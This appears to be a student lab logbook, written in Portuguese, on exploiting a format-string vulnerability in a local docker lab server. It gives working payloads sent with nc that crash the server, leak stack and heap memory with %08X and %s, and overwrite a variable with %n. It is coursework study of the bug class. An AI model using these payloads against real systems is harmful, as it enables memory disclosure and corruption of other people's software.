# LOGBOOK 7 - Format Strings

## Preparação

Começamos por desligar address space randomization que aleatoriza o início da heap ou stack.

```bash
$sudo sysctl -w kernel.randomize_va_space=0
```

## O programa vulnerável

Analisamos `program.c` e identificamos a vulnerabilidade na função `myprintf(char *msg)` onde se tenta dar print de msg.
Compilamos utilizando o Makefile, que compila para 32 e 64 bits.

### Criar os containers

Criamos os containers e iniciamos num dado terminal. Utilizamos os seguintes comandos.

```bash
docker-compose build
docker-compose up
```

o ficheiro docker-compose.yml vai entáo fazer que dois servidores sejam iniciados
Após isto, abrimos outro terminal.

## Task 1: Crashing the program

No novo terminal, que será usado para comunicar com os servidores, testamos o envio de uma string para o servidor indicado.

```bash
echo 'hello' | nc 10.9.0.5 9090
```

O servidor retornou o seguinte:

![](../pictures/log7pic2.png) <br>

Enviando a string `'%s'` para o servidor vai fazer com que a format string tente ir buscar o endereço acima de si na stack e tente imprimir a string que lá estaria. O servidor "crashou" fazendo isto, não houve a mensagem "Returned Properly".

## Task 2: Printing Out the Server Program’s Memory

### Task 2.A: Stack Data

Para conseguirmos imprimir os primeiros 4 bytes, precisamos que o input seja um valor que facilmente identificamos. Usámos `"DEAD"`, que em hexadecimal dá `"44454144"`.

Demos como input `"DEAD"` concatenado com vários `"%08x"`.

```bash
echo "DEAD%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X" | nc 10.9.0.5 9090
```

O servidor retornou o seguinte:

![](../pictures/log7pic3.png) <br>

Como dá para reparar, o final `"44414544"` são os bytes invertidos do endereço da string `"DEAD"` dado como input.

Sendo que cada endereço é constituído por 8 caracteres e que entre `"DEAD"` e `"44414544"` existem 504 caracteres, então existem 63 endereços(504/8) na stack entre a format string e o buffer.

Em suma, para imprimir os primeiros 4 bytes do input inicial é necessário criar uma string com 64 `'%x'`, sendo endereços intermédios nos primeiros 63 e no último os 4 bytes (32 bits) iniciais do input.

### Task 2.B: Heap Data

Nesta tarefa os princípios são os mesmos da tarefa anterior, pois é o mesmo programa, desta vez queremos imprimir o conteúdo de uma string presente na Heap no endereço `0x080b4008`.

![](../pictures/log7pic4.png) <br>

O endereço `0x080b4008` pode ser codificado em string como `"\x08\x0b\x40\x08"`. Para obtermos a string escondida, precisamos de colocar o endereço invertido `"\x08\x40\x0b\x08"` seguido de 63 `"%08x"` e de um `'%s'`, assim a format string lerá este endereço e retornar a string.

Código executado:

```c
#include <string.h>
#include <stdlib.h>

int main() {

    char cmd[296] = "echo \x08\x40\x0b\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %s | nc 10.9.0.5 9090";
    
    system(cmd);
    return 0;
}
```

O output do servidor:

![](../pictures/log7pic5.png) <br>

Por fim, a string escondida do endereço é `"A secret message"`.

## Task 3: Modifying the Server Program’s Memory

### Task 3.A: Change the value to a different value

Para a conclusão desta tarefa, precisamos de alterar o valor da variável `target` com valor inicial `0x11223344` e o endereço `0x080e5068`.

Nas format string conseguimos escrever na zona de memória do argumento passado como parâmetro o número de caracteres escritos até ali, com o comando `%n`.

Na tarefa 2.B, lemos o endereço selecionado, aqui vamos escrever, mas funciona como anteriormente demonstrado.

Código executado:

```c
#include <string.h>
#include <stdlib.h>

int main() {

    char cmd[296] = "echo \x68\x50\x0e\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %n | nc 10.9.0.5 9090";
    
    system(cmd);
    return 0;
}
```

O output do servidor:

![](../pictures/log7pic6.png) <br>

### Task 3.B: Change the value to 0x5000

Na tarefa 3.A, tinhamos de mudar o valor de `target` para qualquer coisa, mas agora temos de mudar para um valor em concreto: `0x5000`, ou seja `20480` em decimal. O comando `%n`, como vimos anteriormente, vai escrever o número de caracteres escritos até ali, assim o input até `%n` terá `20480` caracteres. Para um input tão extenso, utilizamos a notação `%.NX`, com `N = 20480 - 4 - 62*8 = 19980`, para escrever os 19990 caracteres restantes com o valor 0.

Código executado:

```c
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[] = "echo \x68\x50\x0e\x08%.19980X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%n | nc 10.9.0.5 9090";

    system(cmd);
    return 0;
}
```

 output do servidor:

![](../pictures/log7pic7.png) <br>
![](../pictures/log7pic8.png) <br>

Por fim, o valor da variável `target` é `0x00005000`.